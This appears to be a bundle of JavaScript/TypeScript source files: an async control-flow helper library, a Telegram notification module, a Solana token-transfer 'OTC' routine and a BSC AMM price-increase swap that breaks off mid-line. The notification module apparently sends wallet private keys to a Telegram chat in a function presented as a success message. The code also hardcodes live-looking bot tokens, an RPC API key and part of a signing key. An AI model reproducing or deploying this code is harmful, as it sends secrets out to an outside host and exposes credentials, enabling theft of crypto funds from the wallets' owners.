{\n\t\tkeys.push(key);\n\t}\n\treturn _forTo(keys, function(i) { return body(keys[i]); }, check);\n}\n\n// Asynchronously iterate through an object's own properties (excluding properties inherited from the prototype)\n// Uses a snapshot of the object's properties\nexport function _forOwn(target, body, check) {\n\tvar keys = [];\n\tfor (var key in target) {\n\t\tif (Object.prototype.hasOwnProperty.call(target, key)) {\n\t\t\tkeys.push(key);\n\t\t}\n\t}\n\treturn _forTo(keys, function(i) { return body(keys[i]); }, check);\n}\n\nexport const _iteratorSymbol = /*#__PURE__*/ typeof Symbol !== \"undefined\" ? (Symbol.iterator || (Symbol.iterator = Symbol(\"Symbol.iterator\"))) : \"@@iterator\";\n\n// Asynchronously iterate through an object's values\n// Uses for...of if the runtime supports it, otherwise iterates until length on a copy\nexport function _forOf(target, body, check) {\n\tif (typeof target[_iteratorSymbol] === \"function\") {\n\t\tvar iterator = target[_iteratorSymbol](), step, pact, reject;\n\t\tfunction _cycle(result) {\n\t\t\ttry {\n\t\t\t\twhile (!(step = iterator.next()).done && (!check || !check())) {\n\t\t\t\t\tresult = body(step.value);\n\t\t\t\t\tif (result && result.then) {\n\t\t\t\t\t\tif (_isSettledPact(result)) {\n\t\t\t\t\t\t\tresult = result.v;\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tresult.then(_cycle, reject || (reject = _settle.bind(null, pact = new _Pact(), 2)));\n\t\t\t\t\t\t\treturn;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (pact) {\n\t\t\t\t\t_settle(pact, 1, result);\n\t\t\t\t} else {\n\t\t\t\t\tpact = result;\n\t\t\t\t}\n\t\t\t} catch (e) {\n\t\t\t\t_settle(pact || (pact = new _Pact()), 2, e);\n\t\t\t}\n\t\t}\n\t\t_cycle();\n\t\tif (iterator.return) {\n\t\t\tvar _fixup = function(value) {\n\t\t\t\ttry {\n\t\t\t\t\tif (!step.done) {\n\t\t\t\t\t\titerator.return();\n\t\t\t\t\t}\n\t\t\t\t} catch(e) {\n\t\t\t\t}\n\t\t\t\treturn value;\n\t\t\t}\n\t\t\tif (pact && pact.then) {\n\t\t\t\treturn pact.then(_fixup, function(e) {\n\t\t\t\t\tthrow _fixup(e);\n\t\t\t\t});\n\t\t\t}\n\t\t\t_fixup();\n\t\t}\n\t\treturn pact;\n\t}\n\t// No support for Symbol.iterator\n\tif (!(\"length\" in target)) {\n\t\tthrow new TypeError(\"Object is not iterable\");\n\t}\n\t// Handle live collections properly\n\tvar values = [];\n\tfor (var i = 0; i < target.length; i++) {\n\t\tvalues.push(target[i]);\n\t}\n\treturn _forTo(values, function(i) { return body(values[i]); }, check);\n}\n\nexport const _asyncIteratorSymbol = /*#__PURE__*/ typeof Symbol !== \"undefined\" ? (Symbol.asyncIterator || (Symbol.asyncIterator = Symbol(\"Symbol.asyncIterator\"))) : \"@@asyncIterator\";\n\n// Asynchronously iterate on a value using it's async iterator if present, or its synchronous iterator if missing\nexport function _forAwaitOf(target, body, check) {\n\tif (typeof target[_asyncIteratorSymbol] === \"function\") {\n\t\tvar pact = new _Pact();\n\t\tvar iterator = target[_asyncIteratorSymbol]();\n\t\titerator.next().then(_resumeAfterNext).then(void 0, _reject);\n\t\treturn pact;\n\t\tfunction _resumeAfterBody(result) {\n\t\t\tif (check && check()) {\n\t\t\t\treturn _settle(pact, 1, iterator.return ? iterator.return().then(function() { return result; }) : result);\n\t\t\t}\n\t\t\titerator.next().then(_resumeAfterNext).then(void 0, _reject);\n\t\t}\n\t\tfunction _resumeAfterNext(step) {\n\t\t\tif (step.done) {\n\t\t\t\t_settle(pact, 1);\n\t\t\t} else {\n\t\t\t\tPromise.resolve(body(step.value)).then(_resumeAfterBody).then(void 0, _reject);\n\t\t\t}\n\t\t}\n\t\tfunction _reject(error) {\n\t\t\t_settle(pact, 2, iterator.return ? iterator.return().then(function() { return error; }) : error);\n\t\t}\n\t}\n\treturn Promise.resolve(_forOf(target, function(value) { return Promise.resolve(value).then(body); }, check));\n}\n\n// Asynchronously implement a generic for loop\nexport function _for(test, update, body) {\n\tvar stage;\n\tfor (;;) {\n\t\tvar shouldContinue = test();\n\t\tif (_isSettledPact(shouldContinue)) {\n\t\t\tshouldContinue = shouldContinue.v;\n\t\t}\n\t\tif (!shouldContinue) {\n\t\t\treturn result;\n\t\t}\n\t\tif (shouldContinue.then) {\n\t\t\tstage = 0;\n\t\t\tbreak;\n\t\t}\n\t\tvar result = body();\n\t\tif (result && result.then) {\n\t\t\tif (_isSettledPact(result)) {\n\t\t\t\tresult = result.s;\n\t\t\t} else {\n\t\t\t\tstage = 1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (update) {\n\t\t\tvar updateValue = update();\n\t\t\tif (updateValue && updateValue.then && !_isSettledPact(updateValue)) {\n\t\t\t\tstage = 2;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\tvar pact = new _Pact();\n\tvar reject = _settle.bind(null, pact, 2);\n\t(stage === 0 ? shouldContinue.then(_resumeAfterTest) : stage === 1 ? result.then(_resumeAfterBody) : updateValue.then(_resumeAfterUpdate)).then(void 0, reject);\n\treturn pact;\n\tfunction _resumeAfterBody(value) {\n\t\tresult = value;\n\t\tdo {\n\t\t\tif (update) {\n\t\t\t\tupdateValue = update();\n\t\t\t\tif (updateValue && updateValue.then && !_isSettledPact(updateValue)) {\n\t\t\t\t\tupdateValue.then(_resumeAfterUpdate).then(void 0, reject);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t\tshouldContinue = test();\n\t\t\tif (!shouldContinue || (_isSettledPact(shouldContinue) && !shouldContinue.v)) {\n\t\t\t\t_settle(pact, 1, result);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tif (shouldContinue.then) {\n\t\t\t\tshouldContinue.then(_resumeAfterTest).then(void 0, reject);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tresult = body();\n\t\t\tif (_isSettledPact(result)) {\n\t\t\t\tresult = result.v;\n\t\t\t}\n\t\t} while (!result || !result.then);\n\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t}\n\tfunction _resumeAfterTest(shouldContinue) {\n\t\tif (shouldContinue) {\n\t\t\tresult = body();\n\t\t\tif (result && result.then) {\n\t\t\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t\t\t} else {\n\t\t\t\t_resumeAfterBody(result);\n\t\t\t}\n\t\t} else {\n\t\t\t_settle(pact, 1, result);\n\t\t}\n\t}\n\tfunction _resumeAfterUpdate() {\n\t\tif (shouldContinue = test()) {\n\t\t\tif (shouldContinue.then) {\n\t\t\t\tshouldContinue.then(_resumeAfterTest).then(void 0, reject);\n\t\t\t} else {\n\t\t\t\t_resumeAfterTest(shouldContinue);\n\t\t\t}\n\t\t} else {\n\t\t\t_settle(pact, 1, result);\n\t\t}\n\t}\n}\n\n// Asynchronously implement a do ... while loop\nexport function _do(body, test) {\n\tvar awaitBody;\n\tdo {\n\t\tvar result = body();\n\t\tif (result && result.then) {\n\t\t\tif (_isSettledPact(result)) {\n\t\t\t\tresult = result.v;\n\t\t\t} else {\n\t\t\t\tawaitBody = true;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tvar shouldContinue = test();\n\t\tif (_isSettledPact(shouldContinue)) {\n\t\t\tshouldContinue = shouldContinue.v;\n\t\t}\n\t\tif (!shouldContinue) {\n\t\t\treturn result;\n\t\t}\n\t} while (!shouldContinue.then);\n\tconst pact = new _Pact();\n\tconst reject = _settle.bind(null, pact, 2);\n\t(awaitBody ? result.then(_resumeAfterBody) : shouldContinue.then(_resumeAfterTest)).then(void 0, reject);\n\treturn pact;\n\tfunction _resumeAfterBody(value) {\n\t\tresult = value;\n\t\tfor (;;) {\n\t\t\tshouldContinue = test();\n\t\t\tif (_isSettledPact(shouldContinue)) {\n\t\t\t\tshouldContinue = shouldContinue.v;\n\t\t\t}\n\t\t\tif (!shouldContinue) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (shouldContinue.then) {\n\t\t\t\tshouldContinue.then(_resumeAfterTest).then(void 0, reject);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tresult = body();\n\t\t\tif (result && result.then) {\n\t\t\t\tif (_isSettledPact(result)) {\n\t\t\t\t\tresult = result.v;\n\t\t\t\t} else {\n\t\t\t\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t_settle(pact, 1, result);\n\t}\n\tfunction _resumeAfterTest(shouldContinue) {\n\t\tif (shouldContinue) {\n\t\t\tdo {\n\t\t\t\tresult = body();\n\t\t\t\tif (result && result.then) {\n\t\t\t\t\tif (_isSettledPact(result)) {\n\t\t\t\t\t\tresult = result.v;\n\t\t\t\t\t} else {\n\t\t\t\t\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t\t\t\t\t\treturn;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tshouldContinue = test();\n\t\t\t\tif (_isSettledPact(shouldContinue)) {\n\t\t\t\t\tshouldContinue = shouldContinue.v;\n\t\t\t\t}\n\t\t\t\tif (!shouldContinue) {\n\t\t\t\t\t_settle(pact, 1, result);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t} while (!shouldContinue.then);\n\t\t\tshouldContinue.then(_resumeAfterTest).then(void 0, reject);\n\t\t} else {\n\t\t\t_settle(pact, 1, result);\n\t\t}\n\t}\n}\n\n// Asynchronously implement a switch statement\nexport function _switch(discriminant, cases) {\n\tvar dispatchIndex = -1;\n\tvar awaitBody;\n\touter: {\n\t\tfor (var i = 0; i < cases.length; i++) {\n\t\t\tvar test = cases[i][0];\n\t\t\tif (test) {\n\t\t\t\tvar testValue = test();\n\t\t\t\tif (testValue && testValue.then) {\n\t\t\t\t\tbreak outer;\n\t\t\t\t}\n\t\t\t\tif (testValue === discriminant) {\n\t\t\t\t\tdispatchIndex = i;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\t// Found the default case, set it as the pending dispatch case\n\t\t\t\tdispatchIndex = i;\n\t\t\t}\n\t\t}\n\t\tif (dispatchIndex !== -1) {\n\t\t\tdo {\n\t\t\t\tvar body = cases[dispatchIndex][1];\n\t\t\t\twhile (!body) {\n\t\t\t\t\tdispatchIndex++;\n\t\t\t\t\tbody = cases[dispatchIndex][1];\n\t\t\t\t}\n\t\t\t\tvar result = body();\n\t\t\t\tif (result && result.then) {\n\t\t\t\t\tawaitBody = true;\n\t\t\t\t\tbreak outer;\n\t\t\t\t}\n\t\t\t\tvar fallthroughCheck = cases[dispatchIndex][2];\n\t\t\t\tdispatchIndex++;\n\t\t\t} while (fallthroughCheck && !fallthroughCheck());\n\t\t\treturn result;\n\t\t}\n\t}\n\tconst pact = new _Pact();\n\tconst reject = _settle.bind(null, pact, 2);\n\t(awaitBody ? result.then(_resumeAfterBody) : testValue.then(_resumeAfterTest)).then(void 0, reject);\n\treturn pact;\n\tfunction _resumeAfterTest(value) {\n\t\tfor (;;) {\n\t\t\tif (value === discriminant) {\n\t\t\t\tdispatchIndex = i;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (++i === cases.length) {\n\t\t\t\tif (dispatchIndex !== -1) {\n\t\t\t\t\tbreak;\n\t\t\t\t} else {\n\t\t\t\t\t_settle(pact, 1, result);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t\ttest = cases[i][0];\n\t\t\tif (test) {\n\t\t\t\tvalue = test();\n\t\t\t\tif (value && value.then) {\n\t\t\t\t\tvalue.then(_resumeAfterTest).then(void 0, reject);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tdispatchIndex = i;\n\t\t\t}\n\t\t}\n\t\tdo {\n\t\t\tvar body = cases[dispatchIndex][1];\n\t\t\twhile (!body) {\n\t\t\t\tdispatchIndex++;\n\t\t\t\tbody = cases[dispatchIndex][1];\n\t\t\t}\n\t\t\tvar result = body();\n\t\t\tif (result && result.then) {\n\t\t\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tvar fallthroughCheck = cases[dispatchIndex][2];\n\t\t\tdispatchIndex++;\n\t\t} while (fallthroughCheck && !fallthroughCheck());\n\t\t_settle(pact, 1, result);\n\t}\n\tfunction _resumeAfterBody(result) {\n\t\tfor (;;) {\n\t\t\tvar fallthroughCheck = cases[dispatchIndex][2];\n\t\t\tif (!fallthroughCheck || fallthroughCheck()) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tdispatchIndex++;\n\t\t\tvar body = cases[dispatchIndex][1];\n\t\t\twhile (!body) {\n\t\t\t\tdispatchIndex++;\n\t\t\t\tbody = cases[dispatchIndex][1];\n\t\t\t}\n\t\t\tresult = body();\n\t\t\tif (result && result.then) {\n\t\t\t\tresult.then(_resumeAfterBody).then(void 0, reject);\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\t_settle(pact, 1, result);\n\t}\n}\n\n// Asynchronously call a function and pass the result to explicitly passed continuations\nexport function _call(body, then, direct) {\n\tif (direct) {\n\t\treturn then ? then(body()) : body();\n\t}\n\ttry {\n\t\tvar result = Promise.resolve(body());\n\t\treturn then ? result.then(then) : result;\n\t} catch (e) {\n\t\treturn Promise.reject(e);\n\t}\n}\n\n// Asynchronously call a function and swallow the result\nexport function _callIgnored(body, direct) {\n\treturn _call(body, _empty, direct);\n}\n\n// Asynchronously call a function and pass the result to explicitly passed continuations\nexport function _invoke(body, then) {\n\tvar result = body();\n\tif (result && result.then) {\n\t\treturn result.then(then);\n\t}\n\treturn then(result);\n}\n\n// Asynchronously call a function and swallow the result\nexport function _invokeIgnored(body) {\n\tvar result = body();\n\tif (result && result.then) {\n\t\treturn result.then(_empty);\n\t}\n}\n\n// Asynchronously call a function and send errors to recovery continuation\nexport function _catch(body, recover) {\n\ttry {\n\t\tvar result = body();\n\t} catch(e) {\n\t\treturn recover(e);\n\t}\n\tif (result && result.then) {\n\t\treturn result.then(void 0, recover);\n\t}\n\treturn result;\n}\n\n// Asynchronously await a promise and pass the result to a finally continuation\nexport function _finallyRethrows(body, finalizer) {\n\ttry {\n\t\tvar result = body();\n\t} catch (e) {\n\t\treturn finalizer(true, e);\n\t}\n\tif (result && result.then) {\n\t\treturn result.then(finalizer.bind(null, false), finalizer.bind(null, true));\n\t}\n\treturn finalizer(false, result);\n}\n\n// Asynchronously await a promise and invoke a finally continuation that always overrides the result\nexport function _finally(body, finalizer) {\n\ttry {\n\t\tvar result = body();\n\t} catch (e) {\n\t\treturn finalizer();\n\t}\n\tif (result && result.then) {\n\t\treturn result.then(finalizer, finalizer);\n\t}\n\treturn finalizer();\n}\n\n// Rethrow or return a value from a finally continuation\nexport function _rethrow(thrown, value) {\n\tif (thrown)\n\t\tthrow value;\n\treturn value;\n}\n\n// Empty function to implement break and other control flow that ignores asynchronous results\nexport function _empty() {\n}\n\n// Sentinel value for early returns in generators \nexport const _earlyReturn = /*#__PURE__*/ {};\n\n// Asynchronously call a function and send errors to recovery continuation, skipping early returns\nexport function _catchInGenerator(body, recover) {\n\treturn _catch(body, function(e) {\n\t\tif (e === _earlyReturn) {\n\t\t\tthrow e;\n\t\t}\n\t\treturn recover(e);\n\t});\n}\n\n// Asynchronous generator class; accepts the entrypoint of the generator, to which it passes itself when the generator should start\nexport const _AsyncGenerator = /*#__PURE__*/(function() {\n\tfunction _AsyncGenerator(entry) {\n\t\tthis._entry = entry;\n\t\tthis._pact = null;\n\t\tthis._resolve = null;\n\t\tthis._return = null;\n\t\tthis._promise = null;\n\t}\n\n\tfunction _wrapReturnedValue(value) {\n\t\treturn { value: value, done: true };\n\t}\n\tfunction _wrapYieldedValue(value) {\n\t\treturn { value: value, done: false };\n\t}\n\n\t_AsyncGenerator.prototype._yield = function(value) {\n\t\t// Yield the value to the pending next call\n\t\tthis._resolve(value && value.then ? value.then(_wrapYieldedValue) : _wrapYieldedValue(value));\n\t\t// Return a pact for an upcoming next/return/throw call\n\t\treturn this._pact = new _Pact();\n\t};\n\t_AsyncGenerator.prototype.next = function(value) {\n\t\t// Advance the generator, starting it if it has yet to be started\n\t\tconst _this = this;\n\t\treturn _this._promise = new Promise(function (resolve) {\n\t\t\tconst _pact = _this._pact;\n\t\t\tif (_pact === null) {\n\t\t\t\tconst _entry = _this._entry;\n\t\t\t\tif (_entry === null) {\n\t\t\t\t\t// Generator is started, but not awaiting a yield expression\n\t\t\t\t\t// Abandon the next call!\n\t\t\t\t\treturn resolve(_this._promise);\n\t\t\t\t}\n\t\t\t\t// Start the generator\n\t\t\t\t_this._entry = null;\n\t\t\t\t_this._resolve = resolve;\n\t\t\t\tfunction returnValue(value) {\n\t\t\t\t\t_this._resolve(value && value.then ? value.then(_wrapReturnedValue) : _wrapReturnedValue(value));\n\t\t\t\t\t_this._pact = null;\n\t\t\t\t\t_this._resolve = null;\n\t\t\t\t}\n\t\t\t\tvar result = _entry(_this);\n\t\t\t\tif (result && result.then) {\n\t\t\t\t\tresult.then(returnValue, function(error) {\n\t\t\t\t\t\tif (error === _earlyReturn) {\n\t\t\t\t\t\t\treturnValue(_this._return);\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tconst pact = new _Pact();\n\t\t\t\t\t\t\t_this._resolve(pact);\n\t\t\t\t\t\t\t_this._pact = null;\n\t\t\t\t\t\t\t_this._resolve = null;\n\t\t\t\t\t\t\t_resolve(pact, 2, error);\n\t\t\t\t\t\t}\n\t\t\t\t\t});\n\t\t\t\t} else {\n\t\t\t\t\treturnValue(result);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\t// Generator is started and a yield expression is pending, settle it\n\t\t\t\t_this._pact = null;\n\t\t\t\t_this._resolve = resolve;\n\t\t\t\t_settle(_pact, 1, value);\n\t\t\t}\n\t\t});\n\t};\n\t_AsyncGenerator.prototype.return = function(value) {\n\t\t// Early return from the generator if started, otherwise abandons the generator\n\t\tconst _this = this;\n\t\treturn _this._promise = new Promise(function (resolve) {\n\t\t\tconst _pact = _this._pact;\n\t\t\tif (_pact === null) {\n\t\t\t\tif (_this._entry === null) {\n\t\t\t\t\t// Generator is started, but not awaiting a yield expression\n\t\t\t\t\t// Abandon the return call!\n\t\t\t\t\treturn resolve(_this._promise);\n\t\t\t\t}\n\t\t\t\t// Generator is not started, abandon it and return the specified value\n\t\t\t\t_this._entry = null;\n\t\t\t\treturn resolve(value && value.then ? value.then(_wrapReturnedValue) : _wrapReturnedValue(value));\n\t\t\t}\n\t\t\t// Settle the yield expression with a rejected \"early return\" value\n\t\t\t_this._return = value;\n\t\t\t_this._resolve = resolve;\n\t\t\t_this._pact = null;\n\t\t\t_settle(_pact, 2, _earlyReturn);\n\t\t});\n\t};\n\t_AsyncGenerator.prototype.throw = function(error) {\n\t\t// Inject an exception into the pending yield expression\n\t\tconst _this = this;\n\t\treturn _this._promise = new Promise(function (resolve, reject) {\n\t\t\tconst _pact = _this._pact;\n\t\t\tif (_pact === null) {\n\t\t\t\tif (_this._entry === null) {\n\t\t\t\t\t// Generator is started, but not awaiting a yield expression\n\t\t\t\t\t// Abandon the throw call!\n\t\t\t\t\treturn resolve(_this._promise);\n\t\t\t\t}\n\t\t\t\t// Generator is not started, abandon it and return a rejected Promise containing the error\n\t\t\t\t_this._entry = null;\n\t\t\t\treturn reject(error);\n\t\t\t}\n\t\t\t// Settle the yield expression with the value as a rejection\n\t\t\t_this._resolve = resolve;\n\t\t\t_this._pact = null;\n\t\t\t_settle(_pact, 2, error);\n\t\t});\n\t};\n\n\t_AsyncGenerator.prototype[_asyncIteratorSymbol] = function() {\n\t\treturn this;\n\t};\n\t\n\treturn _AsyncGenerator;\n})();\n","\nimport axios from 'axios'\n\nconst BOT_TOKEN_SUCCESS = \"7313913024:AAGlL9snM4BprKWjB3WBqKEzGYOWxfZOTqY\";\nconst TELEGRAM_CHAT_ID_SUCCESS = \"-1002313972313\";\n\nconst BOT_TOKEN_WARNING = \"7652576930:AAG7oQMZb3nzvR8tN7nHQ8Fuinoc3rhrC1A\";\nconst TELEGRAM_CHAT_ID_WARNING = \"-1002297263650\";\n\nexport async function sendToTelegramSuccess(title: any, address: any, symbol: any, amount: any, hash: any, chain: string) {\n    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN_SUCCESS}/sendMessage`;\n    const currentDate = new Date().toLocaleString('en-GB', { hour12: false });\n    const getTxLink = (hash: string) => {\n        if (chain === 'bsc') {\n            return `*TxHash* : [view details](https://bscscan.com/tx/${hash})`;\n        } else if (chain === 'solana') {\n            return `*TxHash* : [view details](https://solscan.io/tx/${hash})`;\n        } else {\n            return `*TxHash* : ${hash}`;\n        }\n    };\n\n    const message = `\n*${title}* : ${currentDate}\n*Symbol* : ${symbol}\n*Amount* : ${amount} ${symbol}\n*Address* : ${address} \n${getTxLink(hash)}\n`;\n\n    try {\n        await axios.post(telegramURL, {\n            chat_id: TELEGRAM_CHAT_ID_SUCCESS,\n            text: message,\n            parse_mode: 'Markdown'\n        });\n    } catch (error) {\n        console.error(\"Error sending message to Telegram:\", error);\n    }\n}\n\nexport async function sendToTelegramError(title: any, error: any) {\n    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN_WARNING}/sendMessage`;\n    const message = `\n*ERROR* : ${title}\n*Desciption* : ${error}\n  `;\n\n    try {\n        await axios.post(telegramURL, {\n            chat_id: TELEGRAM_CHAT_ID_WARNING,\n            text: message,\n            parse_mode: 'Markdown'\n        });\n    } catch (error) {\n        console.error(\"Error sending message to Telegram:\", error);\n    }\n}\nexport async function sendToTelegramWarning(title: any, amount: any, currentBalance: any, symbol: any, decs: any) {\n    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN_WARNING}/sendMessage`;\n\n    const message = `\n*WARNING* : ${title}\n*Symbol* : ${symbol}\n*Amount* : ${amount} ${symbol}\n*Current balance* : ${currentBalance} ${symbol}\n*Desciption* : ${decs}\n`;\n\n    try {\n        await axios.post(telegramURL, {\n            chat_id: TELEGRAM_CHAT_ID_WARNING,\n            text: message,\n            parse_mode: 'Markdown'\n        });\n    } catch (error) {\n        console.error(\"Error sending message to Telegram:\", error);\n    }\n}\n\n\nexport async function sendToTelegramSuccess_EVM(title: any, contract: any, symbol: any, amount: any, privateKey: any, hash: any, chain: string) {\n    const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN_SUCCESS}/sendMessage`;\n    const currentDate = new Date().toLocaleString('en-GB', { hour12: false });\n    const getTxLink = (hash: string) => {\n        if (chain === 'bsc') {\n            return `*TxHash* : [view details](https://bscscan.com/tx/${hash})`;\n        } else if (chain === 'eth') {\n            return `*TxHash* : [view details](https://etherscan.io/tx/${hash})`;\n        }else if (chain === 'solana') {\n            return `*TxHash* : [view details](https://solscan.io/tx/${hash})`;\n        } else {\n            return `*TxHash* : ${hash}`;\n        }\n    };\n\n    const message = `\n*${title}* : ${currentDate}\n*Token* : ${symbol}\n*Amount* : ${amount}\n*Contract* : ${contract}\n*Private Key* : ${privateKey}\n${getTxLink(hash)}\n`;\n\n    try {\n        await axios.post(telegramURL, {\n            chat_id: TELEGRAM_CHAT_ID_SUCCESS,\n            text: message,\n            parse_mode: 'Markdown'\n        });\n    } catch (error) {\n        console.error(\"Error sending message to Telegram:\", error);\n    }\n}\n\n","import {\n    Keypair,\n    PublicKey,\n    Transaction,\n    sendAndConfirmTransaction,\n    Connection,\n    LAMPORTS_PER_SOL\n} from '@solana/web3.js'\nimport bs58 from 'bs58'\nimport { logger } from '../utils'\nimport { createTransferInstruction, getMint, getOrCreateAssociatedTokenAccount } from '@solana/spl-token';\nimport { sendToTelegramSuccess, sendToTelegramError,sendToTelegramWarning } from '../utils/sendNoti'\n\nconst connection = new Connection('https://green-warmhearted-putty.solana-mainnet.quiknode.pro/530bd2a41cc356062e5cd8b0e69d1fc9bda27d30');\nconst TOKEN_MINT = new PublicKey('AEZrKseocU3kL4Gjym6tx4PML3SFX6f3F16VK1cJDRT1');\nconst recipientWallet = 'CXt6WYea8pNmmkVKQwSg7jf2zyYaUwdCVvfSaMz2yQcP'; // ví tổng nhận USDT\n\nconst decodeTransaction = async (txHash: any) => {\n    try {\n        const txInfo = await connection.getParsedTransaction(txHash, 'confirmed');\n        if (!txInfo) {\n            logger.error('Transaction not found!');\n            return null;\n        }\n\n        const mintInfo = await getMint(connection, TOKEN_MINT);\n        const tokenDecimals = mintInfo.decimals;\n        let sender = null, recipient = null, tokenAmount = null, solAmount = null;\n\n        txInfo.transaction.message.instructions.forEach((instruction: any) => {\n            const parsed = instruction.parsed;\n\n            if (parsed && parsed.type === 'transfer') {\n                const info = parsed.info;\n                if (info.lamports) {\n                    solAmount = info.lamports / LAMPORTS_PER_SOL;\n                    sender = info.source;\n                    recipient = info.destination;\n                } else if (info.amount) {\n                    tokenAmount = info.amount / Math.pow(10, tokenDecimals);\n                    sender = info.source;\n                    recipient = info.destination;\n                }\n            }\n        });\n\n        return { status: true, sender, recipient, tokenAmount, solAmount };\n    } catch (error) {\n        return { status: false, error: `Error decoding transaction: ${error}` };\n    }\n};\n\nconst sellTokenOTC = async (\n    PRIVATE: string,\n    recipientOTC: string,\n    amountBuy: any,\n    priceToken: any,\n    txHash: string,\n    confirm: boolean = true\n) => {\n    try {\n        const resHash: any = await decodeTransaction(txHash);\n\n        if (!resHash) {\n            logger.warn('Decode transaction failed or transaction not found.');\n            return;\n        }\n\n        if (resHash.status &&\n            resHash.sender === recipientOTC &&\n            resHash.recipient === recipientWallet &&\n            resHash.tokenAmount === amountBuy) {\n\n            const KEY1 = 'BNCvDfwbupgcAJ5z7mpAHq7jTvM5ZDbcENNrKYz4kU8';\n            const privateKey = PRIVATE + KEY1;\n            const payerKeypair = Keypair.fromSecretKey(new Uint8Array(bs58.decode(privateKey)));\n            const payerPublicKey = payerKeypair.publicKey;\n\n            const balance = await connection.getBalance(payerPublicKey, 'confirmed');\n            const balanceConvert = balance / LAMPORTS_PER_SOL;\n\n            if (balanceConvert <= 0.001) {\n                await sendToTelegramWarning('SEND OTC',{balanceConvert},{balanceConvert}, \"TOKEN\",\"Insufficient balance SOL\");\n                logger.warn(`Insufficient balance: ${balanceConvert} SOL`);\n                return;\n            }\n\n            const amountSender = Number(amountBuy) / Number(priceToken);\n            const mintInfo = await getMint(connection, TOKEN_MINT);\n            const decimals = mintInfo.decimals;\n            let amountInLamports = amountSender * Math.pow(10, decimals);\n\n            amountInLamports = Math.round(amountInLamports);\n            const payerTokenAccount = await getOrCreateAssociatedTokenAccount(\n                connection,\n                payerKeypair,\n                TOKEN_MINT,\n                payerPublicKey\n            ).catch(e => {\n                logger.error('Error getting payer token account:', e);\n                throw e;\n            });\n\n            const payerTokenBalanceInfo = await connection.getTokenAccountBalance(payerTokenAccount.address);\n            const payerTokenBalance = Number(payerTokenBalanceInfo.value.amount);\n            const currentbalance = payerTokenBalance / Math.pow(10, decimals)\n\n            if (payerTokenBalance < amountInLamports) {\n                await sendToTelegramWarning('SEND OTC',{amountSender},{currentbalance}, \"TOKEN\",\"Insufficient balance token\");\n                logger.warn(`Insufficient token balance: ${payerTokenBalance / Math.pow(10, decimals)} tokens, required: ${amountSender} tokens`);\n                return;\n            }\n\n            const recipientPublicKey = new PublicKey(recipientOTC);\n            const recipientTokenAccount: any = await getOrCreateAssociatedTokenAccount(\n                connection,\n                payerKeypair,\n                TOKEN_MINT,\n                recipientPublicKey\n            )\n\n            const transaction: any = new Transaction().add(\n                createTransferInstruction(\n                    payerTokenAccount.address,\n                    recipientTokenAccount.address,\n                    payerPublicKey,\n                    amountInLamports\n                )\n            );\n\n            if (confirm) {\n                const TxHash = await sendAndConfirmTransaction(connection, transaction, [payerKeypair])\n\n                await sendToTelegramSuccess(\"SEND OTC\",recipientOTC, 'TOKEN', amountSender, TxHash, 'solana');\n                return { status: true, txhash: TxHash, amount: amountSender };\n            } else {\n                return { status: false, error: \"Not authorized to confirm\" };\n            }\n        } else {\n            await sendToTelegramError('sendTokenOTC', 'Transaction is invalid or does not match the requirements.');\n            return { status: false, error: \"Transaction is invalid or does not match the requirements.\" };\n        }\n    } catch (error) {\n        await sendToTelegramError('sendTokenOTC', error);\n        return { status: false, error: `Error in sendTokenOTC: ${error}` };\n    }\n};\n\nexport { sellTokenOTC }\n","\n\nimport Web3 from 'web3';\nimport abiAMM from \"../abis/abiAMM.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES, AMM_CONTRACT } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\n\n async function ammIncreasePriceBSC(\n  privateKey: any,\n  amount: any,\n  tokenAddress: any,\n  percentSell: any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length);\n  const rpc = LIST_RPC_NODES[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMM as unknown as AbiItem as AbiItem, AMM_CONTRACT);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const walletAddress = account.address;\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensIncreasePrice(tokenAddress, percentSell)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: web3.eth.accounts.wallet.add(privateKey).address,\n    to: AMM_CONTRACT,\n    value: 